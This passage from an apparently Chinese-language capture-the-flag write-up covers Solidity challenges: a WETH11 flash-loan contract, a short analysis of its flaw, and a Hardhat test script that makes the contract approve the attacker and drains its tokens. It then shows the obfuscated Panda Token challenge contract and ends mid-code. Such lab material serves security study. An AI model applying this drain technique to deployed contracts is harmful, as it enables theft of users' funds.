punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/// @notice Request a flash loan in ETH</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> receiver<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">calldata</span> data<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> prevBalance <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n        Address<span class=\"token punctuation\">.</span><span class=\"token function\">functionCallWithValue</span><span class=\"token punctuation\">(</span>receiver<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">>=</span> prevBalance<span class=\"token punctuation\">,</span> <span class=\"token string\">\"flash loan not returned\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyse-3\"><a href=\"#Analyse-3\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h2><p>合约中引入的approve没有做重入防护，所以execute重入自身进行approve即可</p>\n<h2 id=\"Attack-3\"><a href=\"#Attack-3\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">function</span> <span class=\"token function\">get_data</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">address</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">const</span> Value <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'10'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> data <span class=\"token operator\">=</span>w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeFunctionCall</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token literal-property property\">name</span><span class=\"token operator\">:</span> <span class=\"token string\">'approve'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token literal-property property\">type</span><span class=\"token operator\">:</span><span class=\"token string\">'function'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token literal-property property\">inputs</span><span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token literal-property property\">type</span><span class=\"token operator\">:</span><span class=\"token string\">'address'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token literal-property property\">name</span><span class=\"token operator\">:</span><span class=\"token string\">'owner'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token literal-property property\">type</span><span class=\"token operator\">:</span><span class=\"token string\">'uint256'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token literal-property property\">name</span><span class=\"token operator\">:</span><span class=\"token string\">'spender'</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span>address<span class=\"token punctuation\">,</span>Value<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> data\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">describe</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WETH11\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> owner<span class=\"token punctuation\">,</span>bob<span class=\"token punctuation\">,</span>attacker<span class=\"token punctuation\">,</span>contract<span class=\"token punctuation\">,</span>bobBalance<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> Value <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'10'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">before</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">,</span> bob<span class=\"token punctuation\">,</span>attacker<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getSigners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> Contract <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WETH11\"</span><span class=\"token punctuation\">,</span>owner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        contract <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> Contract<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> <span class=\"token function\">setBalance</span><span class=\"token punctuation\">(</span>bob<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'11'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>bob<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token literal-property property\">value</span><span class=\"token operator\">:</span>Value<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>bob<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>contract<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span><span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>bob<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bobBalance <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>bob<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">it</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"success\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>contract<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span>Value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//start hack</span>\n        <span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span>contract<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token function\">get_data</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>contract<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>Value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">var</span> balance <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">withdrawAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> attacker<span class=\"token punctuation\">.</span><span class=\"token function\">sendTransaction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token literal-property property\">to</span><span class=\"token operator\">:</span> bob<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n            <span class=\"token literal-property property\">value</span><span class=\"token operator\">:</span> balance<span class=\"token punctuation\">,</span>\n          <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//end</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>contract<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>contract<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">var</span> total <span class=\"token operator\">=</span> <span class=\"token function\">BigInt</span><span class=\"token punctuation\">(</span>bobBalance<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token function\">BigInt</span><span class=\"token punctuation\">(</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>bob<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span>total<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230222094944198.png\"></p>\n<h1 id=\"0x0B-Panda-Token\"><a href=\"#0x0B-Panda-Token\" class=\"headerlink\" title=\"0x0B Panda Token\"></a>0x0B Panda Token</h1><h2 id=\"Code-4\"><a href=\"#Code-4\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token number\">0.8</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"openzeppelin-contracts/contracts/access/Ownable.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">PandaToken</span> <span class=\"token keyword\">is</span> ERC20<span class=\"token punctuation\">,</span> Ownable <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> c1<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> usedSignatures<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> burnPending<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">show_uint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">sMint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyOwner <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">uint</span> _c1<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> tokenName<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> tokenSymbol\n    <span class=\"token punctuation\">)</span> <span class=\"token function\">ERC20</span><span class=\"token punctuation\">(</span>tokenName<span class=\"token punctuation\">,</span> tokenSymbol<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">let</span> ptr <span class=\"token operator\">:=</span> <span class=\"token function\">mload</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span>\n            <span class=\"token function\">mstore</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">,</span> <span class=\"token function\">sload</span><span class=\"token punctuation\">(</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token function\">mstore</span><span class=\"token punctuation\">(</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">let</span> slot <span class=\"token operator\">:=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span>\n            <span class=\"token function\">sstore</span><span class=\"token punctuation\">(</span>slot<span class=\"token punctuation\">,</span> <span class=\"token function\">exp</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token function\">mul</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token function\">mstore</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">,</span> <span class=\"token function\">sload</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token function\">sstore</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span> _c1<span class=\"token punctuation\">)</span>\n            <span class=\"token function\">mstore</span><span class=\"token punctuation\">(</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">let</span> slot1 <span class=\"token operator\">:=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span>\n            <span class=\"token function\">mstore</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">,</span> <span class=\"token function\">sload</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token function\">mstore</span><span class=\"token punctuation\">(</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n            <span class=\"token function\">sstore</span><span class=\"token punctuation\">(</span>slot1<span class=\"token punctuation\">,</span> <span class=\"token function\">mul</span><span class=\"token punctuation\">(</span><span class=\"token function\">sload</span><span class=\"token punctuation\">(</span>slot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">calculateAmount</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">uint</span> I1ILLI1L1ILLIL1LLI1IL1IL1IL1L\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint</span> I1I1LI111IL1IL1LLI1IL1IL11L1L<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">let</span> I1ILLI1L1IL1IL1LLI1IL1IL11L1L <span class=\"token operator\">:=</span> <span class=\"token number\">2</span>\n            <span class=\"token keyword\">let</span> I1ILLILL1IL1IL1LLI1IL1IL11L1L <span class=\"token operator\">:=</span> <span class=\"token number\">1000</span>\n            <span class=\"token keyword\">let</span> I1ILLI1L1IL1IL1LLI1IL1IL11L11 <span class=\"token operator\">:=</span> <span class=\"token number\">14382</span>\n            <span class=\"token keyword\">let</span> I1ILLI1L1IL1ILLLLI1IL1IL11L1L <span class=\"token operator\">:=</span> <span class=\"token number\">14382</span>\n            <span class=\"token keyword\">let</span> I1LLLI1L1IL1IL1LLI1IL1IL11L1L <span class=\"token operator\">:=</span> <span class=\"token number\">599</span>\n            <span class=\"token keyword\">let</span> I1ILLI111IL1IL1LLI1IL1IL11L1L <span class=\"token operator\">:=</span> <span class=\"token number\">1</span>\n            I1I1LI111IL1IL1LLI1IL1IL11L1L <span class=\"token operator\">:=</span> <span class=\"token function\">div</span><span class=\"token punctuation\">(</span>\n                <span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>\n                    I1ILLI1L1ILLIL1LLI1IL1IL1IL1L<span class=\"token punctuation\">,</span>\n                    I1ILLILL1IL1IL1LLI1IL1IL11L1L\n                <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>\n                    I1LLLI1L1IL1IL1LLI1IL1IL11L1L<span class=\"token punctuation\">,</span>\n                    <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>I1ILLI111IL1IL1LLI1IL1IL11L1L<span class=\"token punctuation\">,</span> <span class=\"token function\">sload</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">return</span> I1I1LI111IL1IL1LLI1IL1IL11L1L<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> signature<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint</span> giftAmount <span class=\"token operator\">=</span> <span class=\"token function\">calculateAmount</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">bytes32</span> msgHash <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> giftAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">bytes32</span> r<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">bytes32</span> s<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint8</span> v<span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n            r <span class=\"token operator\">:=</span> <span class=\"token function\">mload</span><span class=\"token punctuation\">(</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>signature<span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            s <span class=\"token operator\">:=</span> <span class=\"token function\">mload</span><span class=\"token punctuation\">(</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>signature<span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            v <span class=\"token operator\">:=</span> <span class=\"token builtin\">byte</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">mload</span><span class=\"token punctuation\">(</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>signature<span class=\"token punctuation\">,</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token builtin\">address</span> giftFrom <span class=\"token operator\">=</span> <span class=\"token function\">ecrecover</span><span class=\"token punctuation\">(</span>msgHash<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        burnPending<span class=\"token punctuation\">[</span>giftFrom<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> amount<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>amount <span class=\"token operator\">==</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">,</span> <span class=\"token string\">\"amount error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            <span class=\"token punctuation\">(</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>giftFrom<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> burnPending<span class=\"token punctuation\">[</span>giftFrom<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"balance\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>usedSignatures<span class=\"token punctuation\">[</span>signature<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"used signature\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        usedSignatures<span class=\"token punctuation\">[</span>signature<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">burnPendings</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> burnFrom<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyOwner <span class=\"token punctuation\">&#123;</span>\n        burnPending<span class=\"token punctuation\">[</span>burnFrom<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_burn</span><span class=\"token punctuation\">(</span>burnFrom<span class=\"token punctuation\">,</span> burnPending<span class=\"token punctuation\">[</span>burnFrom<span 